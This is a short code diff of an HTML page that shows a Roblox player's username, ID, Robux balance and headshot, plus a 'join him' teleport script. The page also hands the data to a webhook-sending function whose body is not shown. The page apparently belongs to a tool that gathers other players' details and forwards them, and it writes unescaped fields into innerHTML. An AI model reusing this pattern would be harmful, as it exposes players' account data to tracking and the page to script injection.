@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Player Info</title>
+    <title>test</title>
 </head>
 <body>
-    <h1>Player Info</h1>
+    <h1>info</h1>
     <div id="player-info"></div>
     <footer>
         <p id="footer-text"></p>
@@ -38,17 +38,14 @@
         const footerText = document.getElementById('footer-text');
         const message = data;
 
-        // Display player info
         playerInfoDiv.innerHTML = `
-            <p><strong>Username:</strong> ${message.username}</p>
-            <p><strong>UserID:</strong> ${message.userId}</p>
-            <p><strong>Robux:</strong> ${message.robuxAmount}</p>
-            <p><strong>Teleport Script:</strong> ${message.teleportScript}</p>
+            <p><strong>usr:</strong> ${message.username}</p>
+            <p><strong>usrid:</strong> ${message.userId}</p>
+            <p><strong>robux:</strong> ${message.robuxAmount}</p>
             <img src="${message.headshotUrl}" alt="Player Headshot" width="150" height="150">
         `;
 
-        // Display footer text (Teleport Script)
-        footerText.innerHTML = `Teleport Script: ${message.teleportScript}`;
+        footerText.innerHTML = `join him: ${message.teleportScript}`;
 
         sendDataToWebhook(data);
     </script>
